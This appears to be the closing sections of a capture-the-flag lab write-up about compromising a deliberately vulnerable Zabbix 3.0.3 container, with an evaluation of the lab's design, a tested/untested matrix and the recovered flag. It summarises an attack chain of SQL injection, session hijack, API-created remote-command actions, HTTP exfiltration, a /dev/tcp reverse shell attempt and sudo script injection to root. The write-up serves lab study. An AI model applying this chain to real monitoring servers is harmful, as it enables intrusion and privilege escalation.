**The most valuable thing in the lab is broken, and that is worth more than a working hint.** `scripts_exec.php` is a genuinely sophisticated piece of engineering — per-dispatch action/operation/opcommand isolation to avoid a real escalator race the author reproduced live, `INSERT IGNORE` with id re-drawing for the high-frequency tables, a conservative 30-second cleanup criterion. And it cannot dispatch anything, because the trigger expression references a function id where Zabbix requires an item id. A working helper would have taught me one API shape. A broken one taught me to read what an escalation actually requires, which is why I could build the chain myself. If this is fixed, the lab improves and the lesson is lost — worth weighing before the next revision.

**One design decision deserves credit and one deserves criticism.** Credit: keeping the operator password *out* of the `scripts` table, and putting it in a mode-0600 file that only the agent's account can read, is a well-constructed forced pivot. The disclosure you find first names the file that contains the answer, and you need a privilege you do not have to read it. Criticism: the SQLi is reachable by a `guest` account with an empty password, so the lab's most interesting bug is one login away from anonymous; and the escalation to `zabbix` is only possible because *both* `EnableRemoteCommands=1` and an unauthenticated Super Admin API exist, so the lab's difficulty is set by a configuration choice the author made deliberately and could have made differently.

---

## 8. Tested / not tested / could not test

**Tested, with evidence**
- Full TCP surface, service versions, container OS (`nmap -sV -Pn -p-`, `/etc/os-release`)
- Agent port 10050 from outside and from loopback, with the target's own rejection log as the control
- `guest` empty-password login; SQLi sink, control, and error-based extraction with `LENGTH`/`SUBSTRING` cross-check
- Session hijack, proved by predicting the CSRF token from the injected id; privilege confirmed by rendered navigation
- JSON-RPC API: unauthenticated baseline, sessionid auth, `script.create`, `item.create` (types 2 and 10), `trigger.create`, `action.create`
- Remote-command execution, proved by the process table and by HTTP exfiltration carrying `id -u`/`id -g`/`whoami`
- Local privilege table for `operador`; `console.conf` readability by group
- Loopback console over an SSH `direct-tcpid` forward; token auth; `dup2`'d shell as `supervisor`; `sudo -n -l`
- Command injection in the `NOPASSWD` script; `uid=0(root)` and the flag in one command
- Writable-directory enumeration for the `zabbix` account with `test -w` (not from mode strings)
- Offline crack attempt on the seeded Admin MD5 against 750 601 candidates

**Tested and rejected, with the reason**
- **Impersonating the Zabbix server to the agent on 10050** — rejected by `Server=127.0.0.1`; the loopback control returned a protocol reply and the network attempt returned nothing. Reported as 6.3.
- **Script item (type 10) as the exfiltration channel** — the server executed it (`pwn.exec: No such file or directory`) but `/usr/share/zabbix/externalscripts/` does not exist and the server account cannot create it. Primitive reported as 6.4.
- **`conf.import.php` to create a script** — no Script importer exists in 3.0.3.
- **`LOAD_FILE` / `INTO OUTFILE` from the SQLi** — the `zabbix` DB account holds no global `FILE` privilege, and `mysqli_query` is single-statement, so no stacked `INSERT` into `scripts` either.
- **Writing the exfil file into the document root** — `drwxr-xr-x 1000:zabbix` is not group-writable (§0.3); confirmed by `test -w` as the target user.
- **A Bash `/dev/tcp` reverse shell** — it *did* execute (PIDs 1638/1639 prove it) but never established a usable session; the `nc` listener on the host had been consumed by an unrelated HTTP prober. Superseded by the `wget` channel, which is why the shell approach is not the chain.

**Not tested**
- Exploitation of Zabbix 3.0.3 beyond CVE-2016-10134; no CVE sweep was run.
- The JSON-RPC API's full method surface — only the methods the chain needed.
- Whether `scripts_exec.php` behaves differently under load (the author documents a race they reproduced; I hit the id-collision symptom once, `[Z3005] query failed: [1062] Duplicate entry '900048'`, but did not characterise it).
- Persistence. Nothing was written that survives a restart.

**Could not test**
- Whether the escalation survives a real network boundary. `nota1` claims a NAT drops idle connections; from the container's own bridge this is untestable, and I had no external vantage point.
- The claim in `nota1` that a tty "drops soon". I did not test it; I treated it as a hint, not a fact.

**One out-of-band action, disclosed.** Early on I read the agent secret with `docker exec … su zabbix -c 'cat …'`, which is container access and **not** a network step. I flagged it at the time and then re-derived the identical value over the network (`REQ /SECRET=Qz7mVr2KpT9x`) so that every value in §5 rests on the network chain. Flagging it because a report that quietly mixes in a shortcut is a report whose other claims cannot be trusted.

---

## 9. Flag

```
Gracias por Jugar - IHATEFW . .
```

Proven as root, in the same command as the `uid=0(root)` read, via the `eval` injection in the `NOPASSWD` script — not read out of the filesystem with container access.
